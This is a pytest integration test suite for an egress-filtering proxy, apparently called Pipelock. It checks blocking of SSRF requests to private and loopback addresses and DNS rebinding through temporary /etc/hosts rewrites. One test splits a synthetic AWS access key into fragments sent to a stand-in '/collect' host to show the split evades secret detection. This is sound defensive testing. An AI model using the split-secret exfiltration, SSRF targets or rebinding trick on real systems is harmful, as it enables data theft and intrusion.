from __future__ import annotations

import json
import os
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections.abc import Callable, Iterator
from contextlib import contextmanager
from pathlib import Path
from typing import Any, TextIO

import pytest

PIPELOCK_TEST_BIN = os.getenv("PIPELOCK_730_BIN")
ALLOW_HOSTS_MUTATION = os.getenv("PIPELOCK_730_ALLOW_HOSTS_MUTATION") == "1"
TEST_NET_IP = os.getenv("PIPELOCK_730_TEST_NET_IP", "192.0.2.123")
REBINDS_HOSTNAME = "rebind.issue730.invalid"
FIXTURE_DIR = Path(__file__).parents[2] / "fixtures"
PIPELOCK_CONFIG = FIXTURE_DIR / "pipelock_network_boundary_audit.yaml"
TARGET_FIXTURE = FIXTURE_DIR / "pipelock_network_boundary_target.py"
TARGET_SENTINEL = "issue-730-network-target-ok"
SYNTHETIC_AWS_ACCESS_ID = "AKIA" + "IOSFODNN7EXAMPLE"


def _free_port(host: str) -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind((host, 0))
        return int(listener.getsockname()[1])


def _wait_for_tcp(host: str, port: int, process: subprocess.Popen[str]) -> None:
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline:
        if process.poll() is not None:
            raise RuntimeError(f"process exited before listening on {host}:{port}")
        try:
            with socket.create_connection((host, port), timeout=0.2):
                return
        except OSError:
            time.sleep(0.05)
    raise TimeoutError(f"process did not listen on {host}:{port}")


def _stop(process: subprocess.Popen[str]) -> None:
    if process.poll() is not None:
        return
    process.terminate()
    try:
        process.wait(timeout=5)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait(timeout=5)


@contextmanager
def _target_server(tmp_path: Path) -> Iterator[tuple[int, Path]]:
    port = _free_port(TEST_NET_IP)
    marker = tmp_path / "network-target.jsonl"
    process = subprocess.Popen(
        (
            sys.executable,
            str(TARGET_FIXTURE),
            "--host",
            TEST_NET_IP,
            "--port",
            str(port),
            "--marker",
            str(marker),
        ),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        text=True,
    )
    try:
        _wait_for_tcp(TEST_NET_IP, port, process)
        yield port, marker
    finally:
        _stop(process)


@contextmanager
def _pipelock(tmp_path: Path, *, name: str) -> Iterator[tuple[int, Path]]:
    assert PIPELOCK_TEST_BIN is not None
    port = _free_port("127.0.0.1")
    home = tmp_path / f"home-{name}"
    home.mkdir()
    log_path = tmp_path / f"{name}.log"
    log_handle: TextIO = log_path.open("w", encoding="utf-8")
    env = dict(os.environ)
    env["HOME"] = str(home)
    process = subprocess.Popen(
        (
            PIPELOCK_TEST_BIN,
            "run",
            "--config",
            str(PIPELOCK_CONFIG),
            "--listen",
            f"127.0.0.1:{port}",
        ),
        stdout=log_handle,
        stderr=subprocess.STDOUT,
        text=True,
        env=env,
    )
    try:
        _wait_for_tcp("127.0.0.1", port, process)
        yield port, log_path
    finally:
        _stop(process)
        log_handle.close()


def _fetch(proxy_port: int, target: str) -> tuple[int, str]:
    query = urllib.parse.urlencode({"url": target})
    request_url = f"http://127.0.0.1:{proxy_port}/fetch?{query}"
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        with opener.open(request_url, timeout=10) as response:
            return int(response.status), response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read().decode("utf-8", errors="replace")


def _records(marker: Path) -> list[dict[str, Any]]:
    if not marker.exists():
        return []
    return [json.loads(line) for line in marker.read_text(encoding="utf-8").splitlines()]


def _with_hosts_mapping(original: str, hostname: str, ip: str) -> str:
    retained: list[str] = []
    for line in original.splitlines():
        fields = line.split()
        if hostname in fields[1:]:
            continue
        retained.append(line)
    retained.append(f"{ip} {hostname}")
    return "\n".join(retained) + "\n"


def _write_hosts(content: str) -> None:
    completed = subprocess.run(
        ("sudo", "tee", "/etc/hosts"),
        input=content,
        capture_output=True,
        text=True,
        timeout=10,
    )
    assert completed.returncode == 0, completed.stderr


def _resolved_addresses(hostname: str) -> set[str]:
    return {item[4][0] for item in socket.getaddrinfo(hostname, None, type=socket.SOCK_STREAM)}


@pytest.mark.integration
@pytest.mark.skipif(
    PIPELOCK_TEST_BIN is None,
    reason="requires the pinned Pipelock #730 compatibility runtime",
)
@pytest.mark.parametrize(
    "target",
    [
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://192.168.0.1/",
        "http://localhost:9/",
    ],
)
def test_private_ipv4_and_hostname_resolution_are_blocked(
    target: str,
    tmp_path: Path,
) -> None:
    with _pipelock(tmp_path, name="private-ipv4") as (proxy_port, log_path):
        status, _body = _fetch(proxy_port, target)

    assert status >= 400
    lowered = log_path.read_text(encoding="utf-8").lower()
    assert "ssrf" in lowered or "private" in lowered or "loopback" in lowered


@pytest.mark.integration
@pytest.mark.skipif(
    PIPELOCK_TEST_BIN is None,
    reason="requires the pinned Pipelock #730 compatibility runtime",
)
def test_ipv6_loopback_equivalent_is_blocked(tmp_path: Path) -> None:
    with _pipelock(tmp_path, name="ipv6-loopback") as (proxy_port, log_path):
        status, _body = _fetch(proxy_port, "http://[::1]:9/")

    assert status >= 400
    lowered = log_path.read_text(encoding="utf-8").lower()
    assert "ssrf" in lowered or "loopback" in lowered or "::1" in lowered


@pytest.mark.integration
@pytest.mark.skipif(
    PIPELOCK_TEST_BIN is None,
    reason="requires the pinned Pipelock #730 compatibility runtime",
)
def test_multistage_secret_split_across_independent_fetches_reaches_upstream(
    tmp_path: Path,
) -> None:
    first = SYNTHETIC_AWS_ACCESS_ID[:10]
    second = SYNTHETIC_AWS_ACCESS_ID[10:]
    assert SYNTHETIC_AWS_ACCESS_ID not in first
    assert SYNTHETIC_AWS_ACCESS_ID not in second

    with _target_server(tmp_path) as (target_port, marker):
        with _pipelock(tmp_path, name="multistage") as (proxy_port, log_path):
            first_target = f"http://{TEST_NET_IP}:{target_port}/collect?" + urllib.parse.urlencode(
                {"fragment": first}
            )
            second_target = f"http://{TEST_NET_IP}:{target_port}/collect?" + urllib.parse.urlencode(
                {"fragment": second}
            )
            first_status, first_body = _fetch(proxy_port, first_target)
            second_status, second_body = _fetch(proxy_port, second_target)

    assert first_status == 200
    assert second_status == 200
    assert TARGET_SENTINEL in first_body
    assert TARGET_SENTINEL in second_body
    fragments = [str(record["query"]["fragment"][0]) for record in _records(marker)]
    assert fragments == [first, second]
    assert "".join(fragments) == SYNTHETIC_AWS_ACCESS_ID
    assert SYNTHETIC_AWS_ACCESS_ID not in log_path.read_text(encoding="utf-8")


@pytest.mark.integration
@pytest.mark.skipif(
    PIPELOCK_TEST_BIN is None or not ALLOW_HOSTS_MUTATION,
    reason="requires pinned Pipelock plus the isolated CI hosts-mutation fixture",
)
def test_same_hostname_private_rebinding_is_blocked_or_pinned_to_safe_resolution(
    tmp_path: Path,
    record_property: Callable[[str, object], None],
) -> None:
    hosts_path = Path("/etc/hosts")
    original_hosts = hosts_path.read_text(encoding="utf-8")

    with _target_server(tmp_path) as (target_port, marker):
        try:
            _write_hosts(_with_hosts_mapping(original_hosts, REBINDS_HOSTNAME, TEST_NET_IP))
            assert TEST_NET_IP in _resolved_addresses(REBINDS_HOSTNAME)

            with _pipelock(tmp_path, name="dns-rebinding") as (proxy_port, _log_path):
                target = f"http://{REBINDS_HOSTNAME}:{target_port}/rebind"
                first_status, first_body = _fetch(proxy_port, target)
                assert first_status == 200
                assert TARGET_SENTINEL in first_body
                assert len(_records(marker)) == 1

                _write_hosts(_with_hosts_mapping(original_hosts, REBINDS_HOSTNAME, "127.0.0.1"))
                assert "127.0.0.1" in _resolved_addresses(REBINDS_HOSTNAME)

                second_status, second_body = _fetch(proxy_port, target)
                records_after = _records(marker)
                if second_status >= 400:
                    assert len(records_after) == 1
                    record_property("dns_rebinding_outcome", "blocked_private_resolution")
                else:
                    assert second_status == 200
                    assert TARGET_SENTINEL in second_body
                    assert len(records_after) == 2
                    record_property("dns_rebinding_outcome", "pinned_prevalidated_ip")
        finally:
            _write_hosts(original_hosts)
